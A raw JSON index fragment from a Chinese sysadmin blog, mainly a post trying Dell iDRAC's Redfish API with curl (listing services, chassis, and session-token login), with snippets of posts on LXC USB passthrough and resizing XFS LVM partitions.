\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e看最长的带\u003ccode\u003eGT-I9100\u003c/code\u003e那一行，\u003ccode\u003eID 04e8:6860，VendorID:ProdID\u003c/code\u003e，说明\u003ccode\u003eVendor=04e8 ProdID=6860\u003c/code\u003e，记下来。\u003c/p\u003e","title":"lxc下如何让usb设备pass through直接到达虚机"},{"content":"各大主板厂商纷纷支持下一代带外管理标准redfish。\n其实Dell的idrac管理做的是相当好的，那么来看看对redfish的支持吧。\n先看看v1都有什么命令\ncurl -s \u0026#34;https://10.16.24.15/redfish/v1\u0026#34; -k -u root:xxxxxxxx | jq . 结果如下： { \u0026#34;@odata.context\u0026#34;: \u0026#34;/redfish/v1/$metadata#ServiceRoot.ServiceRoot\u0026#34;, \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1\u0026#34;, \u0026#34;@odata.type\u0026#34;: \u0026#34;#ServiceRoot.v1_1_0.ServiceRoot\u0026#34;, \u0026#34;AccountService\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Managers/iDRAC.Embedded.1/AccountService\u0026#34; }, \u0026#34;Chassis\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis\u0026#34; }, \u0026#34;Description\u0026#34;: \u0026#34;Root Service\u0026#34;, \u0026#34;EventService\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/EventService\u0026#34; }, \u0026#34;Id\u0026#34;: \u0026#34;RootService\u0026#34;, \u0026#34;JsonSchemas\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/JSONSchemas\u0026#34; }, \u0026#34;Links\u0026#34;: { \u0026#34;Sessions\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Sessions\u0026#34; } }, \u0026#34;Managers\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Managers\u0026#34; }, \u0026#34;Name\u0026#34;: \u0026#34;Root Service\u0026#34;, \u0026#34;Oem\u0026#34;: { \u0026#34;Dell\u0026#34;: { \u0026#34;@odata.type\u0026#34;: \u0026#34;#DellServiceRoot.v1_0_0.ServiceRootSummary\u0026#34;, \u0026#34;IsBranded\u0026#34;: 0, \u0026#34;ManagerMACAddress\u0026#34;: \u0026#34;50:9A:4C:82:B9:3F\u0026#34;, \u0026#34;ServiceTag\u0026#34;: \u0026#34;7Q9N8P2\u0026#34; } }, \u0026#34;RedfishVersion\u0026#34;: \u0026#34;1.0.2\u0026#34;, \u0026#34;Registries\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Registries\u0026#34; }, \u0026#34;SessionService\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/SessionService\u0026#34; }, \u0026#34;Systems\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Systems\u0026#34; }, \u0026#34;Tasks\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/TaskService\u0026#34; }, \u0026#34;UpdateService\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/UpdateService\u0026#34; } } 好多服务撒，挑其中一个分支看看：\ncurl -s \u0026#34;https://10.16.24.15/redfish/v1/Chassis\u0026#34; -k -u root:alibaba | jq . 结果如下： { \u0026#34;@odata.context\u0026#34;: \u0026#34;/redfish/v1/$metadata#ChassisCollection.ChassisCollection\u0026#34;, \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis/\u0026#34;, \u0026#34;@odata.type\u0026#34;: \u0026#34;#ChassisCollection.ChassisCollection\u0026#34;, \u0026#34;Description\u0026#34;: \u0026#34;Collection of Chassis\u0026#34;, \u0026#34;Members\u0026#34;: [ { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis/System.Embedded.1\u0026#34; }, { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis/Enclosure.Internal.0-1:RAID.Integrated.1-1\u0026#34; } ], \u0026#34;Members@odata.count\u0026#34;: 2, \u0026#34;Name\u0026#34;: \u0026#34;Chassis Collection\u0026#34; } 再试试Session的管理：\ncurl -v -k -X POST -d \u0026#39;{\u0026#34;UserName\u0026#34;:\u0026#34;root\u0026#34;,\u0026#34;Password\u0026#34;:\u0026#34;xxxxxxxx\u0026#34;}\u0026#39; -H \u0026#34;Content-Type: application/json\u0026#34; https://10.16.24.15/redfish/v1/Sessions | jq . 注意Dell官方的文档里居然不提json的事，直接用它给的命令会报错的，post的数据明显是个json。\n结果： * About to connect() to 10.16.24.15 port 443 (#0) * Trying 10.16.24.15... connected * Connected to 10.16.24.15 (10.16.24.15) port 443 (#0) * Initializing NSS with certpath: sql:/etc/pki/nssdb * warning: ignoring value of ssl.verifyhost * skipping SSL peer certificate verification * SSL connection using TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 * Server certificate: * subject: E=support@dell.com,CN=idrac-7Q9N8P2,OU=Remote Access Group,O=Dell Inc.,L=Round Rock,ST=Texas,C=US * start date: Mar 15 06:13:00 2018 GMT * expire date: Mar 15 06:14:22 2028 GMT * common name: idrac-7Q9N8P2 * issuer: E=support@dell.com,CN=idrac-7Q9N8P2,OU=Remote Access Group,O=Dell Inc.,L=Round Rock,ST=Texas,C=US \u0026gt; POST /redfish/v1/Sessions HTTP/1.1 \u0026gt; User-Agent: curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.21 Basic ECC zlib/1.2.3 libidn/1.18 libssh2/1.4.2 \u0026gt; Host: 10.16.24.15 \u0026gt; Accept: */* \u0026gt; Content-Type: application/json \u0026gt; Content-Length: 39 \u0026gt; } [data not shown] \u0026lt; HTTP/1.1 201 Created \u0026lt; OData-Version: 4.0 \u0026lt; Keep-Alive: timeout=60, max=199 \u0026lt; Content-Type: application/json;odata.metadata=minimal;charset=utf-8 \u0026lt; Server: iDRAC/8 \u0026lt; Location: /redfish/v1/Sessions/13 \u0026lt; Date: Wed, 05 Sep 2018 08:26:55 GMT \u0026lt; X-Auth-Token: d42c621ee25ad8b49c0d24bbd763f54f \u0026lt; Cache-Control: no-cache \u0026lt; Content-Length: 745 \u0026lt; Connection: Keep-Alive \u0026lt; Access-Control-Allow-Origin: * \u0026lt; Accept-Ranges: bytes \u0026lt; { [data not shown] * Connection #0 to host 10.16.24.15 left intact * Closing connection #0 { \u0026#34;@Message.ExtendedInfo\u0026#34;: [ { \u0026#34;Message\u0026#34;: \u0026#34;The resource has been created successfully\u0026#34;, \u0026#34;MessageArgs\u0026#34;: [], \u0026#34;MessageArgs@odata.count\u0026#34;: 0, \u0026#34;MessageId\u0026#34;: \u0026#34;Base.1.0.Created\u0026#34;, \u0026#34;RelatedProperties\u0026#34;: [], \u0026#34;RelatedProperties@odata.count\u0026#34;: 0, \u0026#34;Resolution\u0026#34;: \u0026#34;None\u0026#34;, \u0026#34;Severity\u0026#34;: \u0026#34;OK\u0026#34; }, { \u0026#34;Message\u0026#34;: \u0026#34;A new resource is successfully created.\u0026#34;, \u0026#34;MessageArgs\u0026#34;: [], \u0026#34;MessageArgs@odata.count\u0026#34;: 0, \u0026#34;MessageId\u0026#34;: \u0026#34;IDRAC.1.6.SYS414\u0026#34;, \u0026#34;RelatedProperties\u0026#34;: [], \u0026#34;RelatedProperties@odata.count\u0026#34;: 0, \u0026#34;Resolution\u0026#34;: \u0026#34;No response action is required.\u0026#34;, \u0026#34;Severity\u0026#34;: \u0026#34;Informational\u0026#34; } ], \u0026#34;@odata.context\u0026#34;: \u0026#34;/redfish/v1/$metadata#Session.Session\u0026#34;, \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Sessions/13\u0026#34;, \u0026#34;@odata.type\u0026#34;: \u0026#34;#Session.v1_0_2.Session\u0026#34;, \u0026#34;Description\u0026#34;: \u0026#34;User Session\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;13\u0026#34;, \u0026#34;Name\u0026#34;: \u0026#34;User Session\u0026#34;, \u0026#34;Password\u0026#34;: null, \u0026#34;UserName\u0026#34;: \u0026#34;root\u0026#34; } 记下这行：X-Auth-Token: d42c621ee25ad8b49c0d24bbd763f54f\n试试这种Session的功效\ncurl -k https://10.16.24.15/redfish/v1/Chassis -s --header \u0026#34;X-Auth-Token: d42c621ee25ad8b49c0d24bbd763f54f\u0026#34; | jq . 结果： { \u0026#34;@odata.context\u0026#34;: \u0026#34;/redfish/v1/$metadata#ChassisCollection.ChassisCollection\u0026#34;, \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis/\u0026#34;, \u0026#34;@odata.type\u0026#34;: \u0026#34;#ChassisCollection.ChassisCollection\u0026#34;, \u0026#34;Description\u0026#34;: \u0026#34;Collection of Chassis\u0026#34;, \u0026#34;Members\u0026#34;: [ { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis/System.Embedded.1\u0026#34; }, { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis/Enclosure.Internal.0-1:RAID.Integrated.1-1\u0026#34; } ], \u0026#34;Members@odata.count\u0026#34;: 2, \u0026#34;Name\u0026#34;: \u0026#34;Chassis Collection\u0026#34; } 搞定，如果还想需要更多的功能，就去看手册吧。\n","permalink":"https://rendoumi.com/posts/20240124-dell_redfish/","summary":"\u003cp\u003e各大主板厂商纷纷支持下一代带外管理标准redfish。\u003c/p\u003e\n\u003cp\u003e其实Dell的idrac管理做的是相当好的，那么来看看对redfish的支持吧。\u003c/p\u003e\n\u003cp\u003e先看看v1都有什么命令\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecurl -s  \u003cspan class=\"s2\"\u003e\u0026#34;https://10.16.24.15/redfish/v1\u0026#34;\u003c/span\u003e -k -u root:xxxxxxxx \u003cspan class=\"p\"\u003e|\u003c/span\u003e jq .\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e结果如下：\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;@odata.context\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/\u003c/span\u003e\u003cspan class=\"nv\"\u003e$metadata\u003c/span\u003e\u003cspan class=\"s2\"\u003e#ServiceRoot.ServiceRoot\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;@odata.type\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;#ServiceRoot.v1_1_0.ServiceRoot\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;AccountService\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/Managers/iDRAC.Embedded.1/AccountService\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Chassis\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/Chassis\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Description\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Root Service\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;EventService\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/EventService\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;RootService\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;JsonSchemas\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/JSONSchemas\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Links\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Sessions\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/Sessions\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Managers\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/Managers\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Root Service\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Oem\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Dell\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;@odata.type\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;#DellServiceRoot.v1_0_0.ServiceRootSummary\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;IsBranded\u0026#34;\u003c/span\u003e: 0,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;ManagerMACAddress\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;50:9A:4C:82:B9:3F\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;ServiceTag\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;7Q9N8P2\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;RedfishVersion\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;1.0.2\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Registries\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/Registries\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;SessionService\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/SessionService\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Systems\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/Systems\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Tasks\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/TaskService\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;UpdateService\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/UpdateService\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e好多服务撒，挑其中一个分支看看：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecurl -s  \u003cspan class=\"s2\"\u003e\u0026#34;https://10.16.24.15/redfish/v1/Chassis\u0026#34;\u003c/span\u003e -k -u root:alibaba \u003cspan class=\"p\"\u003e|\u003c/span\u003e jq .  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e结果如下：\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;@odata.context\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/\u003c/span\u003e\u003cspan class=\"nv\"\u003e$metadata\u003c/span\u003e\u003cspan class=\"s2\"\u003e#ChassisCollection.ChassisCollection\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/Chassis/\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;@odata.type\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;#ChassisCollection.ChassisCollection\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Description\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Collection of Chassis\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Members\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/Chassis/System.Embedded.1\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/Chassis/Enclosure.Internal.0-1:RAID.Integrated.1-1\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e]\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Members@odata.count\u0026#34;\u003c/span\u003e: 2,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Chassis Collection\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e再试试Session的管理：\u003c/p\u003e","title":"Dell的idrac redfish初探"},{"content":"系统是xfs文件格式。/root空间不够了。必须对空间进行调整，悲剧的是xfs只能增加空间，不能缩减空间，必须曲线救国了。\n查看一下，缺省有两个lvm的分区\n/dev/mapper/centos-root 40G /dev/mapper/centos-home 20G 只能减小home分区，再增大root分区了。\n先备份home分区，并缩小到2G：\n# yum -y install xfsdump # xfsdump -f /home.xfsdump /home please enter label for this dump session (timeout in 300 sec) 